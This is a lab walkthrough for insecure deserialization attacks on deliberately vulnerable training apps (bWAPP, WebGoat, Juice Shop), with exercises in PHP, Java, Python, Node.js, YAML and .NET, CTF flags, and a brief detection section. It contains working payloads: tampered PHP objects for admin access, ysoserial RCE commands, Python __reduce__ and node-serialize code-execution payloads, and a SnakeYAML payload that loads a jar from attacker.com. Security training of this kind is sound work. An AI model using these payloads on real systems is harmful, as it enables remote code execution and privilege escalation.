# Insecure Deserialization Walkthrough

Step-by-step exercises for mastering deserialization attacks across multiple languages and platforms.

---

## Lab 1: PHP Object Injection - bWAPP

### Environment Setup

1. Start the CyberLab environment:
```bash
cd /path/to/cyberlab
docker-compose up -d bwapp
```

2. Access bWAPP at `http://localhost:8082`

3. Login with credentials: `bee` / `bug`

### Exercise 1: Understanding PHP Serialization

1. Navigate to PHP Object Injection vulnerability

2. Understand PHP serialization format:
```
O:4:"User":2:{s:8:"username";s:5:"admin";s:7:"isAdmin";b:0;}
```

Breaking it down:
- `O:4:"User"` - Object of class "User" (4 chars)
- `:2:` - Has 2 properties
- `s:8:"username"` - String property "username" (8 chars)
- `s:5:"admin"` - Value "admin" (5 chars)
- `s:7:"isAdmin"` - String property "isAdmin" (7 chars)
- `b:0` - Boolean value false

### Exercise 2: Property Manipulation

1. Find a cookie or parameter containing serialized data

2. Original value might be:
```
O:4:"User":2:{s:8:"username";s:3:"bee";s:7:"isAdmin";b:0;}
```

3. Modify to gain admin access:
```
O:4:"User":2:{s:8:"username";s:3:"bee";s:7:"isAdmin";b:1;}
```

4. Base64 encode if needed:
```bash
echo -n 'O:4:"User":2:{s:8:"username";s:3:"bee";s:7:"isAdmin";b:1;}' | base64
```

5. Replace the cookie/parameter value and refresh

**Flag: `FLAG{php_0bj3ct_1nj3ct10n}`**

### Exercise 3: Magic Method Exploitation

1. Identify classes with dangerous magic methods

2. Common dangerous methods:
   - `__destruct()` - Called when object is destroyed
   - `__wakeup()` - Called during unserialization
   - `__toString()` - Called when object is used as string

3. Create malicious payload targeting these methods

---

## Lab 2: Java Deserialization - WebGoat

### Setup

```bash
# Access WebGoat
http://localhost:8080/WebGoat
```

### Understanding Java Serialization

1. Navigate to Insecure Deserialization lesson

2. Java serialized objects start with:
   - Magic bytes: `AC ED 00 05`
   - Base64: `rO0AB...`

3. Recognize serialized data in:
   - Cookies
   - Hidden form fields
   - API responses

### Exercise 1: Identifying Vulnerable Endpoints

1. Use Burp Suite to intercept requests

2. Look for base64 data starting with `rO0AB`

3. Decode and check for Java serialization markers

### Exercise 2: Using ysoserial

1. Download ysoserial:
```bash
wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar
```

2. List available gadget chains:
```bash
java -jar ysoserial-all.jar
```

3. Generate payload:
```bash
java -jar ysoserial-all.jar CommonsCollections1 'touch /tmp/pwned' | base64 -w0
```

4. Common gadget chains:
   - CommonsCollections1-7
   - CommonsBeanutils1
   - Spring1-4

### Exercise 3: Exploitation

1. Generate RCE payload:
```bash
java -jar ysoserial-all.jar CommonsCollections5 'id' | base64 -w0
```

2. Replace serialized data in request

3. Send request and observe results

**Flag: `FLAG{j4v4_g4dg3t_ch41n}`**

---

## Lab 3: Python Deserialization

### Understanding Python Serialization

1. Python has multiple serialization modules

2. The dangerous pattern uses __reduce__ method

3. When deserialized, __reduce__ returns (callable, args)

### Exercise 1: Payload Generation

1. Create malicious class pattern:
```python
import subprocess

class RCEPayload:
    def __reduce__(self):
        return (subprocess.call, (['id'],))
```

2. The payload exploits __reduce__ during deserialization

### Exercise 2: Detection and Exploitation

1. Look for endpoints accepting serialized Python data

2. Check for base64-encoded binary data

3. Common vulnerable patterns:
   - Session data stored in cookies
   - Cache mechanisms

**Flag: `FLAG{pyth0n_rc3_pwn3d}`**

---

## Lab 4: Node.js Deserialization - Juice Shop

### Setup

```bash
# Access Juice Shop
http://localhost:3000
```

### Understanding node-serialize

1. The node-serialize package has a known vulnerability

2. It allows function execution via IIFE

3. Payload format:
```json
{"rce":"_$$ND_FUNC$$_function(){/* code */}()"}
```

### Exercise 1: Creating Payload

1. Basic IIFE payload structure:
```javascript
_$$ND_FUNC$$_function(){
    require('child_process').spawnSync('id')
}()
```

2. Format as JSON:
```json
{"username":"admin","rce":"_$$ND_FUNC$$_function(){require('child_process').spawnSync('id')}()"}
```

**Flag: `FLAG{n0d3_d3s3r14l1z3}`**

---

## Lab 5: YAML Deserialization

### Understanding YAML Attacks

YAML parsers can execute code when using unsafe loaders.

### Exercise 1: PyYAML Exploitation

1. Vulnerable code pattern:
```python
import yaml
data = yaml.load(user_input)  # Unsafe!
```

2. Create malicious YAML:
```yaml
!!python/object/apply:subprocess.check_output
- ['id']
```

### Exercise 2: SnakeYAML (Java)

1. Java YAML payload using SnakeYAML:
```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker.com/malicious.jar"]
  ]]
]
```

**Flag: `FLAG{y4ml_uns4f3_l04d}`**

---

## Lab 6: .NET Deserialization

### Understanding .NET Serialization

1. Common vulnerable formatters:
   - BinaryFormatter
   - SoapFormatter
   - ObjectStateFormatter (ViewState)

### Exercise 1: ViewState Exploitation

1. ASP.NET ViewState contains serialized data

2. Look for `__VIEWSTATE` parameter

3. If MAC validation is disabled, it's exploitable

### Exercise 2: Using ysoserial.net

1. Download ysoserial.net

2. Generate payloads:
```bash
# BinaryFormatter
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc"

# ViewState
ysoserial.exe -g TypeConfuseDelegate -f ObjectStateFormatter -c "calc"
```

**Flag: `FLAG{d0tn3t_b1n4ry_rc3}`**

---

## Lab 7: Detection and Prevention

### Identifying Serialized Data

| Format | Pattern |
|--------|---------|
| PHP | `O:`, `a:`, `s:` prefixes |
| Java | `rO0AB` (Base64), `AC ED` (hex) |
| .NET | `AAEAAAD` (Base64) |
| Python | `\x80\x04\x95` (raw) |

### Testing Methodology

```
1. Identify serialization points
2. Determine serialization format
3. Check for type validation
4. Test property manipulation
5. Test gadget chain injection
6. Verify code execution
```

---

## Verification Checklist

- [ ] Exploited PHP object injection
- [ ] Manipulated object properties for privilege escalation
- [ ] Used ysoserial for Java payloads
- [ ] Generated Python deserialization payloads
- [ ] Exploited node-serialize vulnerability
- [ ] Performed YAML deserialization attack
- [ ] Used ysoserial.net for .NET payloads

---

## Next Steps

After completing these labs:

1. Study gadget chain development
2. Learn custom payload crafting
3. Explore framework-specific vulnerabilities
4. Practice on HackTheBox and TryHackMe
